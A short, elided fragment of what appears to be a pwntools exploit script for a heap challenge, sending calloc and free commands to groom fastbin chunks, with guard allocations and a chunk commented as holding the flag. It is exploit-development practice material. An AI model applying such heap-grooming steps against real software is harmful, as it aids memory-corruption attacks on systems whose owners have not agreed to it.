...
p.sendline(f"calloc 7 75")
p.sendline(f"calloc 8 75") # guarding
p.sendline(f"calloc 9 1044")
p.sendline(f"calloc 10 1044") # guarding

p.sendline(f"calloc 11 75")
p.sendline(f"calloc 12 75") # guarding 
...
p.sendline(f"free 7") # fastbin 1 

p.sendline(f"free 9")

p.sendline(f"free 11") # fastbin 2 (flag)
